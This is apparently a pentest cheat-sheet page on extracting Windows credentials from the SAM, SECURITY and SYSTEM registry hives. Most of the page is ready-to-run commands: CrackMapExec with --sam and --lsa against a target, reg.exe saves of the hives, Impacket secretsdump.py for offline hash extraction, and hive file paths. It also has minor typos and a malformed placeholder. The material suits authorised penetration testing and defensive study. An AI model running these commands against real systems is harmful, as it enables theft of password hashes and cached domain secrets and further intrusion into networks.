# SAM & LSA

## Theory

|   Hive   |                    Info                   |
| :------: | :---------------------------------------: |
|    SAM   |          Local cached credentials         |
| SECURITY | Comain cached credentials _(LSA secrets)_ |
|  SYSTEM  |      Info to decrypt previous secrets     |

## Method

### CrackMapExec

#### SAM

```bash
sudo crackmapexec smb <IP> -u '<user>' -p '<pwd' -d <DOMAIN> --sam
```

#### LSA

```bash
sudo crackmapexec smb <IP> -u '<user>' -p '<pwd' -d <DOMAIN> --lsa
```

### Reg.exe

```bash
bC:\WIND0WS\system32>reg.exe save HKLM\SAM <file>.hiv
C:\WIND0WS\system32>reg.exe save HKLM\SECURITY <file>.hiv
C:\WIND0WS\system32>reg.exe save HKLM\SYSTEM <file>.hiv
```

* Use SecretDump from Impacket to dump credentials from the hives&#x20;

```bash
sudo /usr/local/bin/secretsdump.py -sam sam.dump -security security.dump -system system.dump LOCAL
```

* Main hives folder location :
  * `HKEY_LOCAL_MACHINE\SYSTEM` : `%windir%\system32\config\SYSTEM`
  * `HKEY_LOCAL_MACHINE\SAM` : `%windir%\system32\config\SAM`
  * `HKEY_LOCAL_MACHINE\SECURITY` : `%windir%\system32\config\SECURITY`
  * `HKEY_LOCAL_MACHINE\SOFTWARE` : `%windir%\system32\config\SOFTWARE`
  *   `HKEY_USERS\.DEFAULT` : `%windir%\system32\config\DEFAULT`

      * Open regedit.exe - clic on HKLM - clic on the menu `file` - `load hive` - named the key
      * Once the hive loaded on the editor, dump it :&#x20;

      `reg.exe save "HIVE\CLE" DUMPFILE.HIV`
